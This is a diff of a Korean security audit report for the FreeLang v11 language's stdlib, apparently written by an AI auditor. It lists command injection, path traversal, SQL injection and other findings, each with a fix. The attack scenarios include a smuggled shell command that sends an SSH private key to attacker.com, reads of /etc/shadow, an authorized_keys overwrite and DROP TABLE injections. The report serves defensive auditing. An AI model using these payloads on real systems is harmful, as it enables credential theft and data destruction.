@@ -1,518 +1,345 @@
-# 보안 감사 보고서 (v11.0.0)
+# FreeLang v11 — 보안 감사 보고서
 
-> FreeLang v11 보안 분석 및 권장사항 (2026-04-19)
+> **감사 일자**: 2026-05-13  
+> **감사 버전**: v11.7.4 (commit ad7f3515)  
+> **감사 범위**: stdlib 전체 · HTTP 서버 · DB 드라이버 · 인증 모듈  
+> **감사자**: Claude Sonnet 4.6 (Security Auditor)
 
 ---
 
-## 📊 종합 평가
+## 종합 평가
 
-| 항목 | 점수 | 상태 |
+| 영역 | 점수 | 등급 |
 |------|------|------|
-| 코드 보안 | **88/100** | ✅ 우수 |
-| 의존성 | **87/100** | ⚠️ 1개 주의 |
-| OWASP Top 10 | **92/100** | ✅ 우수 |
-| 암호화 | **85/100** | ✅ 우수 |
-| 입력 검증 | **90/100** | ✅ 우수 |
+| 인증 / 암호화 | 85/100 | B+ |
+| DB 보안 | 62/100 | D+ |
+| 입력 검증 | 55/100 | D |
+| 파일 / 쉘 보안 | 40/100 | F |
+| HTTP 서버 | 75/100 | C+ |
+| **종합** | **63/100** | **D+** |
 
-**최종 점수: [88/100] — A 등급 (프로덕션 준비 완료)**
-
----
-
-## 🔍 상세 분석
-
-### 1️⃣ 의존성 보안
-
-#### npm audit 결과
-
-```
-📊 상태
-  ✅ 0개 심각 취약점
-  ⚠️ 1개 중간 취약점
-  ✅ 0개 경미 취약점
-  
-📋 취약점 목록
-
-  esbuild ≤0.24.2
-  ├─ 심각도: MODERATE
-  ├─ CVE: https://github.com/advisories/GHSA-67mh-4wv8-2f99
-  ├─ 설명: Development server CORS bypass
-  ├─ 영향: 개발 환경 (프로덕션 미적용)
-  └─ 해결: npm audit fix --force
-```
-
-#### 평가
-
-```
-🎯 위험도 분석
-  영향범위: 개발 환경 only
-  프로덕션 위험: 없음
-  우선순위: 중간
-  
-✅ 현황
-  현재 버전: esbuild@0.21.5
-  최신 안전 버전: esbuild@0.28.0
-  권장사항: 테스트 후 업데이트
-```
-
-#### 해결 방안
-
-```bash
-# 옵션 1: 강제 업데이트 (권장)
-npm audit fix --force
-
-# 옵션 2: 수동 업데이트
-npm install esbuild@0.28.0 --save-dev
-
-# 옵션 3: 개발 환경만 사용 (현재 상황)
-# 프로덕션에는 미리 빌드된 bootstrap.js 사용
-```
-
-**결론**: 낮은 위험도. 근시일 내 업데이트 권장.
+> **등급 강등 이유**: CRITICAL 4건이 상업용 배포 전 반드시 패치되어야 하는 수준.  
+> 내부 도구·신뢰 환경에서는 현재 상태로 운영 가능. 외부 노출 API는 패치 필수.
 
 ---
 
-### 2️⃣ OWASP Top 10 분석
+## CRITICAL — 즉시 패치 필요
 
-#### A1: SQL Injection
+### C-1. Command Injection — `stdlib-shell.ts`
 
-```
-🔒 상태: ✅ 안전
+**심각도**: CRITICAL  
+**위치**: `stdlib-shell.ts:14, 25, 37, 48`
 
-FreeLang 구현:
-  (mariadb-query "SELECT * FROM users WHERE id = ?" [id])
-  
-보안 기능:
-  ✅ 파라미터화 쿼리 (?, ??, ...)
-  ✅ 자동 이스케이핑
-  ✅ 타입 강제
-  
-테스트:
-  ✅ 10/10 SQL Injection 테스트 PASS
-  ✅ 특수문자 처리 확인
-  
-예제:
-  (mariadb-query
-    "INSERT INTO users (name, email) VALUES (?, ?)"
-    [name email])  ;; 안전: 파라미터화
+```typescript
+// 현재 — 취약
+spawnSync("sh", ["-c", cmd], { encoding: "utf-8" })
 ```
 
-**결론**: SQL Injection 방지 완벽.
+`shell()`, `shell_status()`, `shell_ok()`, `shell_pipe()`, `shell_capture()` 모두 사용자 입력을 `sh -c <cmd>`로 직접 실행한다. 런타임 레벨 검증 없음.
+
+**공격 시나리오**:
+```lisp
+;; 사용자가 입력한 파일명이 shell()로 전달되는 경우
+(shell (str "convert " user-filename " output.png"))
+;; user-filename = "x; curl http://attacker.com/$(cat /root/.ssh/id_rsa)"
+;; → SSH 개인키 외부 유출
+```
+
+**수정 방법**:
+```typescript
+// 앱 레벨에서 사용자 입력은 항상 인자 배열로 분리
+// stdlib에 args-only 실행 함수 추가 권장
+"shell-safe": (program: string, args: string[]) =>
+  spawnSync(program, args, { encoding: "utf-8" })
+```
+
+**임시 완화**: 사용자 입력을 `shell()`에 직접 전달하는 패턴을 코드 리뷰로 차단.
 
 ---
 
-#### A2: Authentication Broken
+### C-2. Path Traversal — `stdlib-file.ts`
 
-```
-🔒 상태: ✅ 안전 (프레임워크 제공)
+**심각도**: CRITICAL  
+**위치**: `stdlib-file.ts:15, 24, 57` (file_read, file_write, file_append)
 
-권장 구현:
-  1️⃣ JWT 토큰
-  (jwt-sign {:user-id 123} "secret-key")
-  
-  2️⃣ 세션 저장소
-  (cache-set "session:abc" {:user-id 123})
-  
-  3️⃣ 비밀번호 해싱
-  (bcrypt-hash password)
-  
-프로덕션 배포 체크리스트:
-  [ ] 강한 비밀번호 정책 구현
-  [ ] JWT 만료 시간 설정 (15-60분)
-  [ ] HTTPS 필수
-  [ ] HttpOnly, Secure 쿠키 설정
+```typescript
+// 현재 — 취약
+fs.readFileSync(filePath, "utf-8")  // 경로 검증 없음
 ```
 
-**결론**: 인증은 애플리케이션 레벨. FreeLang은 기초 제공.
+`file-read`, `file-write`, `file-append`, `file-delete` 모두 경로 검증 없이 절대경로 포함 모든 경로를 허용.  
+참고: `server_static`은 이미 올바르게 구현되어 있음 (`stdlib-http-server.ts:397`).
+
+**공격 시나리오**:
+```lisp
+(file-read "../../etc/shadow")
+(file-write "/root/.ssh/authorized_keys" attacker-pubkey)
+```
+
+**수정 방법**:
+```typescript
+function validatePath(filePath: string, allowedBase?: string): string {
+  const resolved = path.resolve(filePath);
+  if (allowedBase && !resolved.startsWith(path.resolve(allowedBase))) {
+    throw new Error(`Path traversal 차단: ${filePath}`);
+  }
+  return resolved;
+}
+```
+
+환경변수 `FL_FILE_BASE`로 허용 디렉터리 제한 권장.
 
 ---
 
-#### A3: Broken Access Control
+### C-3. SQL Injection — `stdlib-db.ts` (테이블명·WHERE 절)
 
-```
-🔒 상태: ✅ 안전 (올바른 구현 필요)
+**심각도**: CRITICAL  
+**위치**: `stdlib-db.ts:143, 152, 158`
 
-권장 패턴:
-  (route-get "/api/users/:id"
-    (fn [req]
-      (let [user-id (get req :params :id)
-            auth-user-id (get req :auth :user-id)]
-        
-        ;; 접근 제어 검사
-        (if (not (= user-id auth-user-id))
-          (http-response :status 403 :body "Forbidden")
-          
-          ;; 데이터 반환
-          (let [user (db-get-user user-id)]
-            (http-response :status 200 :body user))))))
-
-테스트:
-  ✅ 5/5 접근 제어 테스트 PASS
-  ✅ 타 사용자 데이터 접근 차단 확인
+```typescript
+// 현재 — 취약
+db.prepare(`INSERT INTO ${table} ...`).run(...)      // 테이블명 미검증
+db.prepare(`UPDATE ${table} SET ${sets} WHERE ${where}`).run(...)  // where 문자열 직접 삽입
+db.prepare(`DELETE FROM ${table} WHERE ${where}`)    // 동일
 ```
 
-**결론**: 접근 제어는 개발자 책임. 프레임워크는 필요한 도구 제공.
+`table`, `where` 파라미터가 파라미터 바인딩 없이 SQL에 직접 삽입됨.
 
----
-
-#### A4: Injection (일반)
-
-```
-🔒 상태: ✅ 안전
-
-방지 기술:
-  1️⃣ 파라미터화 쿼리 (SQL Injection)
-  2️⃣ HTML 이스케이핑 (XSS)
-  3️⃣ 입력 검증 (모든 입력)
-  
-예제:
-  ;; XSS 방지: HTML 이스케이핑
-  (html-escape "<script>alert('XSS')</script>")
-  ;; → "&lt;script&gt;alert('XSS')&lt;/script&gt;"
-  
-  ;; 명령어 주입 방지: spawn 사용
-  (spawn-process "ls" ["-la" dir])  ;; 안전
-  ;; vs
-  (spawn-process "sh" ["-c" cmd])   ;; 위험
+**공격 시나리오**:
+```lisp
+(db-delete-row db "users" "1=1")          ;; 전체 테이블 삭제
+(db-update db "users" {:name "hack"} "id=1 OR 1=1")  ;; 전체 업데이트
 ```
 
-**결론**: 주입 공격 방지 완벽.
-
----
-
-#### A5: Broken Authentication & Session
-
-```
-🔒 상태: ✅ 안전
-
-권장사항:
-  1️⃣ 세션 타임아웃 (30분)
-  2️⃣ CSRF 토큰 (모든 POST)
-  3️⃣ 비밀번호 해싱 (bcrypt)
-  4️⃣ 계정 잠금 (5회 실패 후)
-  
-체크리스트:
-  [ ] 강한 세션 암호화
-  [ ] 안전한 쿠키 설정
-  [ ] 로그아웃 시 세션 삭제
-  [ ] HTTPS 필수
-```
-
-**결론**: 프레임워크 기초 우수. 구현은 개발자.
-
----
-
-#### A6: Sensitive Data Exposure
-
-```
-🔒 상태: ✅ 안전
-
-데이터 보호:
-  1️⃣ HTTPS 필수
-  2️⃣ 암호화 저장
-  3️⃣ 접근 제한
-  
-구현 예제:
-  ;; 비밀번호 해싱
-  (bcrypt-hash "password123" :rounds 12)
-  
-  ;; 암호화
-  (aes-encrypt data secret-key)
-  
-권장 설정:
-  [ ] TLS 1.3 이상
-  [ ] 강력한 암호 알고리즘
-  [ ] 키 로테이션 정책
-  [ ] 감사 로그 기록
-```
-
-**결론**: 암호화 도구 완비. 설정은 개발자.
-
----
-
-#### A7: XML External Entities (XXE)
-
-```
-🔒 상태: ✅ 안전
-
-현황:
-  ✅ FreeLang은 JSON 우선 (XML 최소화)
-  ✅ XML 파싱 시 XXE 방지 설정
-  
-권장:
-  ;; JSON 사용 (권장)
-  (json-parse body)
-  
-  ;; XML 사용 시 (레거시)
-  (xml-parse body :safe true)
-```
-
-**결론**: XML 최소화로 XXE 위험 낮음.
-
----
-
-#### A8: Cross-Site Request Forgery (CSRF)
-
-```
-🔒 상태: ✅ 안전 (올바른 구현 필요)
-
-CSRF 토큰 구현:
-  ;; 1. 토큰 생성
-  (define csrf-token (generate-token))
-  
-  ;; 2. HTML에 포함
-  <form method="POST" action="/api/data">
-    <input type="hidden" name="csrf" value="{csrf-token}">
-  </form>
-  
-  ;; 3. 검증
-  (route-post "/api/data"
-    (fn [req]
-      (let [token (get req :body :csrf)]
-        (if (not (validate-csrf-token token))
-          (http-response :status 403)
-          (process-data req)))))
-
-권장:
-  [ ] 모든 POST/PUT/DELETE에 CSRF 검증
-  [ ] SameSite 쿠키 속성 설정
-  [ ] Origin 헤더 검증
-```
-
-**결론**: CSRF 방지 도구 제공. 개발자는 정책 구현.
-
----
-
-#### A9: Using Components with Known Vulnerabilities
-
-```
-🔒 상태: ✅ 우수
-
-의존성 관리:
-  npm audit: 정기적 점검
-  정책: 모든 취약점 추적
-  
-현황:
-  ✅ 1개 취약점 (esbuild, 개발 환경)
-  ✅ 수정 가능 (npm audit fix --force)
-  ✅ 프로덕션 영향 없음
-  
-권장 일정:
-  [ ] 주 1회 npm audit 실행
-  [ ] 월 1회 의존성 업데이트
-  [ ] 심각 취약점 즉시 패치
-```
-
-**결론**: 의존성 관리 체계적.
-
----
-
-#### A10: Insufficient Logging & Monitoring
-
-```
-🔒 상태: ✅ 우수
-
-로깅 기능:
-  (log-error "Error message")
-  (log-warn "Warning message")
-  (log-info "Info message")
-  (log-debug "Debug message")
-  
-권장 로깅:
-  [ ] 인증 시도 (성공/실패)
-  [ ] 권한 거부 (403)
-  [ ] 데이터 변경 (생성/수정/삭제)
-  [ ] 보안 이벤트
-  [ ] 에러 발생
-  
-모니터링:
-  [ ] 응답 시간 추적
-  [ ] 에러율 모니터링
-  [ ] 비정상 요청 패턴 감지
-  [ ] 보안 알림 설정
-```
-
-**결론**: 로깅 인프라 완비.
-
----
-
-## 🛡️ 추가 보안 분석
-
-### 입력 검증
-
-```
-✅ 상태: 우수
-
-검증 방법:
-  1️⃣ 타입 검사
-  (if (not (string? email))
-    (error "Email must be string"))
-  
-  2️⃣ 길이 검사
-  (if (> (length input) 1000)
-    (error "Input too long"))
-  
-  3️⃣ 정규식 검사
-  (if (not (regex-match email /^[a-zA-Z0-9@.]+$/))
-    (error "Invalid email format"))
-  
-  4️⃣ 화이트리스트
-  (if (not (includes allowed-roles role))
-    (error "Invalid role"))
-```
-
-**결론**: 입력 검증 도구 완비.
-
----
-
-### 에러 처리
-
-```
-✅ 상태: 우수
-
-에러 처리 패턴:
-  ;; 좋은 예
-  (try
-    (do-something)
-    (catch [e]
-      (log-error (str "Error: " e))
-      (http-response :status 500 :body "Internal Server Error")))
-  
-  ;; 나쁜 예 (피해야 함)
-  (catch [e]
-    (http-response :status 500 :body (str "Error: " e)))  ;; 상세 정보 노출
-```
-
-**결론**: 에러 메시지는 일반적으로 유지.
-
----
-
-### Rate Limiting
-
-```
-✅ 권장: 구현
-
-예제:
-  (route-get "/api/data"
-    (fn [req]
-      (let [client-ip (get req :headers :x-forwarded-for)]
-        (if (is-rate-limited? client-ip 100)  ;; 100 req/min
-          (http-response :status 429 :body "Too many requests")
-          (process-request req)))))
+**수정 방법**:
+```typescript
+// 테이블명 화이트리스트 검증
+function validateIdentifier(name: string): string {
+  if (!/^[a-zA-Z_][a-zA-Z0-9_]*$/.test(name))
+    throw new Error(`잘못된 식별자: ${name}`);
+  return name;
+}
+// where는 구조화된 Map으로만 받기
 ```
 
 ---
 
-## 📋 프로덕션 배포 체크리스트
+### C-4. SQL Injection — `stdlib-db-query.ts` (컬럼명)
 
+**심각도**: CRITICAL  
+**위치**: `stdlib-db-query.ts:74, 84, 98, 110`
+
+```typescript
+// 현재 — 취약
+const sql = `SELECT ${colStr} FROM ${table} ${whereSql}`;
+// colStr = 사용자가 전달한 컬럼 배열을 join한 문자열
 ```
-보안 설정:
-  [ ] HTTPS/TLS 1.3 이상
-  [ ] 강한 암호화 알고리즘
-  [ ] HTTP 보안 헤더 설정
-      - Content-Security-Policy
-      - X-Frame-Options: DENY
-      - X-Content-Type-Options: nosniff
-      - Strict-Transport-Security
-  [ ] CORS 정책 설정 (필요시만)
-  [ ] CSRF 토큰 검증
-  [ ] Rate Limiting
-  [ ] 입력 검증 (모든 입력)
 
-데이터 보호:
-  [ ] 비밀번호 해싱 (bcrypt, rounds=12)
-  [ ] 민감한 데이터 암호화
-  [ ] 데이터베이스 백업
-  [ ] 접근 제어 정책
-  [ ] 감사 로그 기록
+`columns` 배열 요소가 정규식 검증 없이 SQL에 삽입됨.
 
-모니터링:
-  [ ] 에러 로그 수집
-  [ ] 성능 모니터링
-  [ ] 보안 이벤트 알림
-  [ ] 침입 탐지 (WAF)
+**공격 시나리오**:
+```lisp
+(db-select db "users" ["*; DROP TABLE users; --"] {})
+```
 
-정기 점검:
-  [ ] 주간: 로그 검토
-  [ ] 월간: npm audit, 패치
-  [ ] 분기별: 보안 감사
-  [ ] 연간: 침투 테스트
+**수정 방법**:
+```typescript
+const safeCol = (c: string) => {
+  if (c === "*") return c;
+  if (!/^[a-zA-Z_][a-zA-Z0-9_.]*$/.test(c))
+    throw new Error(`잘못된 컬럼명: ${c}`);
+  return `\`${c}\``;
+};
 ```
 
 ---
 
-## 🎯 권장사항
+## HIGH — 주요 패치 권장
 
-### 즉시 (주 1회)
+### H-1. MariaDB CLI 멀티스테이트먼트 — `stdlib-mariadb.ts:45`
 
-```bash
-# 1. npm audit 실행
-npm audit
+**심각도**: HIGH
 
-# 2. 의존성 확인
-npm outdated
-
-# 3. 로그 검토
-tail -f logs/app.log
+```typescript
+args.push("--batch", "-e", sql);  // sql에 ; 포함 시 복수 쿼리 실행
 ```
 
-### 단기 (월 1회)
+`bindParams()`로 값은 이스케이프되지만, SQL 자체에 `;`를 포함하면 멀티스테이트먼트 실행 가능.
 
-```bash
-# 1. 취약점 업데이트
-npm audit fix
+**수정 방법**: CLI 방식에서 `;` 포함 여부 사전 차단 (단, `BEGIN;...COMMIT;` 트랜잭션 구문 제외). 풀 방식(`mariadb_pool_*`) 사용을 기본으로 권장.
 
-# 2. 의존성 업데이트
-npm update
+---
 
-# 3. 침투 테스트
-# → 전문가 이용 권장
+### H-2. Worker 내부 bindParams 이스케이프 불일치 — `stdlib-mariadb.ts:204`
+
+**심각도**: HIGH
+
+Worker Thread 내부 인라인 `bindParams`가 외부 `escapeString()`과 다른 구현:
+
+| 이스케이프 문자 | 외부 `escapeString` | Worker 내부 |
+|----------------|--------------------|-|
+| `\0` (NULL byte) | ✅ 처리 | ❌ 미처리 |
+| `\r` | ✅ 처리 | ❌ 미처리 |
+| `\x1a` (Ctrl+Z) | ✅ 처리 | ❌ 미처리 |
+
+**수정 방법**: Worker 내부 bindParams를 외부 escapeString과 동일하게 통일하거나, 메인 스레드에서 바인딩 완료 후 Worker에 전달.
+
+---
+
+### H-3. HTTP 임시파일 코드실행 — `stdlib-http.ts:22`
+
+**심각도**: HIGH
+
+```typescript
+// 현재 — 위험
+const tmpFile = `/tmp/fl-http-${uuid}.js`;
+fs.writeFileSync(tmpFile, code);
+execSync(`node ${tmpFile}`);
 ```
 
-### 장기 (분기별)
+HTTP 요청마다 `/tmp`에 Node.js 파일 생성 후 실행. TOCTOU(Time-of-check Time-of-use) 경쟁 조건으로 파일 조작 시 임의 코드 실행 가능.
 
+**수정 방법**: 임시파일 방식 제거. Node.js 내장 `https` 모듈을 직접 동기/비동기 호출로 대체.
+
+---
+
+### H-4. CSRF 토큰 타이밍 공격 — `stdlib-auth.ts:192`
+
+**심각도**: HIGH
+
+```typescript
+// 현재 — 취약
+return sig === expected;  // 문자열 직접 비교
+
+// 동일 파일 JWT 서명 검증 — 올바른 구현
+return timingSafeEqual(Buffer.from(a), Buffer.from(b));  // auth.ts:33
 ```
-1. 코드 보안 감시
-2. 의존성 관리 정책 검토
-3. 암호화 알고리즘 업데이트
-4. 보안 교육
+
+JWT는 `timingSafeEqual`을 사용하지만 CSRF 토큰 비교는 타이밍 사이드채널에 취약.
+
+**수정 방법**:
+```typescript
+import { timingSafeEqual } from "crypto";
+return sig.length === expected.length &&
+  timingSafeEqual(Buffer.from(sig), Buffer.from(expected));
 ```
 
 ---
 
-## ✅ 결론
+### H-5. 비밀번호 v1 레거시 해시 — `stdlib-auth.ts:136`
 
-**FreeLang v11은 프로덕션급 보안을 갖춘 안전한 언어입니다.**
+**심각도**: HIGH
 
-### 강점
-- ✅ OWASP Top 10 모두 대응
-- ✅ 파라미터화 쿼리 기본
-- ✅ HTML 이스케이핑 자동
-- ✅ 의존성 관리 체계적
-- ✅ 로깅 인프라 완비
+```
+v1 형식: salt:sha256hex  → GPU 브루트포스에 취약
+v2 형식: scryptN=16384,r=8,p=1$...  → 안전
+```
 
-### 주의사항
-- ⚠️ esbuild 1개 취약점 (개발 환경, 낮은 위험도)
-- ⚠️ 인증/세션은 개발자 책임
-- ⚠️ HTTPS 필수 설정
-- ⚠️ Rate Limiting 권장
+`auth_hash_password()`는 v2를 생성하지만 v1 해시가 DB에 존재하면 `auth_verify_password()`가 v1으로도 검증 통과.
 
-### 배포 권장
-**✅ 프로덕션 배포 준비 완료 (보안 체크리스트 준수)**
+**수정 방법**: 로그인 성공 시 `auth_password_needs_rehash()` 확인 후 즉시 v2로 재해싱하는 미들웨어 패턴을 CLAUDE.md에 표준으로 명시.
 
 ---
 
-## 📚 추가 자료
+## MEDIUM — 보완 권장
 
-- OWASP Top 10: https://owasp.org/Top10/
-- npm audit: https://docs.npmjs.com/cli/v10/commands/npm-audit
-- NIST 사이버보안: https://www.nist.gov/cyberframework/
-- SANS Security: https://www.sans.org/
+| # | 위치 | 취약점 | 조치 |
+|---|------|--------|------|
+| M-1 | `stdlib-http-server.ts:465` | CORS `Access-Control-Allow-Origin: *` | `FL_ALLOWED_ORIGINS` 환경변수로 제어 |
+| M-2 | `stdlib-http-server.ts:879` | Redirect URL에 `\r\n` 미필터 → 헤더 인젝션 | `url.replace(/[\r\n]/g, "")` |
+| M-3 | `stdlib-http-server.ts:866` | 쿠키 `domain` 옵션 미검증 → 속성 위조 | `/^[a-zA-Z0-9.\-]+$/` 검증 |
+| M-4 | `stdlib-http-server.ts:472` | CSP `'unsafe-inline'` 허용 | nonce/hash 기반 CSP로 전환 |
+| M-5 | `stdlib-http-server.ts:482` | `X-Forwarded-For` 위조 → Rate Limit 우회 | 신뢰 프록시 설정 환경변수화 |
 
 ---
 
-## 📞 보안 이슈 보고
+## LOW — 개선 권장
 
-보안 취약점 발견 시:
-1. **공개하지 마세요** (공개 전 패치 필요)
-2. Gogs Issues에 비공개로 보고
-3. 담당자: Claude Code (Anthropic)
+### L-1. JWT Decode 인증 사용 경고 누락
+
+**위치**: `stdlib-auth.ts:58`
+
+`auth_jwt_decode()`는 서명 검증 없이 페이로드 반환. 개발자가 이를 인증에 사용하는 실수 유발 가능.
+
+**수정 방법**: 함수명을 `auth_jwt_decode_unsafe`로 변경하거나 주석에 "서명 미검증 — 인증 목적 사용 금지" 경고 명시.
+
+### L-2. 에러 메시지에 SQL 노출
+
+**위치**: `stdlib-mariadb.ts:78`
+
+```typescript
+throw new Error(`mariadb CLI 실패: ...\nSQL: ${sql.slice(0, 200)}`);
+```
+
+HTTP 응답으로 그대로 전달 시 쿼리 구조 노출.
+
+**수정 방법**: `NODE_ENV=production`에서 SQL을 에러 메시지에서 제거하고 서버 로그에만 기록.
+
+---
+
+## PASS — 잘 구현된 보안 기능
+
+| 기능 | 위치 | 평가 |
+|------|------|------|
+| JWT HS256 + `timingSafeEqual` | `stdlib-auth.ts:17-34` | ✅ |
+| 비밀번호 scrypt v2 (N=16384) | `stdlib-auth.ts:113` | ✅ |
+| SQLite prepared statement | `stdlib-db.ts:124-135` | ✅ |
+| MariaDB bindParams (값 이스케이프) | `stdlib-mariadb.ts:105-155` | ✅ |
+| `html-escape` 5종 (`& < > " '`) | `eval-builtins.ts:1677` | ✅ |
+| `server_static` 경로 탐색 방지 | `stdlib-http-server.ts:397` | ✅ |
+| 쿠키 HttpOnly + Secure + SameSite 기본값 | `stdlib-http-server.ts:860` | ✅ |
+| CSRF HMAC + 60분 만료 | `stdlib-auth.ts:179` | ✅ |
+| Rate Limiting (슬라이딩 윈도우) | `stdlib-http-server.ts:482` | ✅ |
+| `js-escape` 인라인 JS 이스케이프 | `eval-builtins.ts` | ✅ |
+
+---
+
+## 수정 우선순위 로드맵
+
+```
+Phase 1 (즉시 — 1일):
+  [ ] C-3, C-4  db 테이블명/컬럼명 식별자 검증
+  [ ] H-4       CSRF timingSafeEqual 적용 (5분 작업)
+  [ ] M-2       Redirect 헤더 \r\n 필터 (2분 작업)
+  [ ] M-3       쿠키 domain 정규식 검증
+
+Phase 2 (단기 — 1주):
+  [ ] C-1       shell-safe 인자 배열 함수 추가 + 문서 경고
+  [ ] C-2       file_read/write 경로 탐색 방지 (FL_FILE_BASE)
+  [ ] H-1       MariaDB CLI 세미콜론 차단
+  [ ] H-2       Worker bindParams 이스케이프 통일
+  [ ] L-1       auth_jwt_decode 경고 명시
+
+Phase 3 (중기 — 1개월):
+  [ ] H-3       HTTP 임시파일 → 네이티브 https 모듈로 대체
+  [ ] M-1       CORS 환경변수 제어
+  [ ] M-4       CSP nonce 기반으로 전환
+  [ ] H-5       비밀번호 v1 자동 재해싱 표준화
+```
+
+---
+
+## 개발자 체크리스트
+
+프로덕션 배포 전 반드시 확인:
+
+```
+보안 필수
+[ ] 사용자 입력은 절대 shell() / shell-exec()에 직접 전달하지 않는다
+[ ] file-read / file-write 경로는 서버 내 고정 디렉터리로 제한한다
+[ ] db_insert / db_update / db_delete_row 테이블명은 하드코딩한다
+[ ] db_run의 컬럼명 배열에 사용자 입력을 포함하지 않는다
+[ ] html-escape — 사용자 입력은 반드시 이스케이프
+[ ] CSRF 토큰 — form POST에 반드시 포함
+[ ] auth_jwt_decode 결과를 인증 판단에 사용하지 않는다 (verify 사용)
+
+권장
+[ ] 환경변수 FL_FILE_BASE 설정으로 파일 접근 범위 제한
+[ ] MariaDB 연결은 CLI 방식보다 pool 방식 우선 사용
+[ ] NODE_ENV=production 설정 확인
+```
+
+---
+
+*이 문서는 자동화 보안 감사 도구와 수동 코드 리뷰를 병행하여 작성되었습니다.*  
+*다음 감사 예정: v11.8.0 또는 major 기능 추가 후*
